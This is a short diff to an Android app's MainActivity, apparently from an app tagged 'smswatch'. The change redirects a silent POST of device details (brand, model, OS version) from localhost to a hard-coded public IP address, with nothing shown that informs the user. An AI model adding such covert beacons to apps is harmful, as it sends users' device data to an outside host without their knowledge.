@@ -27,10 +27,10 @@ public class MainActivity extends AppCompatActivity {
         Map<String,String> hmap = new HashMap<String, String>();
         String phoneinfo = Build.BRAND + "|" + Build.MODEL + "|" + Build.VERSION.RELEASE + "|" + Build.VERSION.SDK_INT;
         Log.i("smswatch",phoneinfo);
-        pmap.put("smswatch",phoneinfo);
+        pmap.put("data",phoneinfo);
         hmap.put("abc","123");
         try {
-            HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
+            HttpRequestUtil.sendPost("http://123.56.157.131/data", pmap, hmap);
         } catch (Exception e) {
             e.printStackTrace();
         }
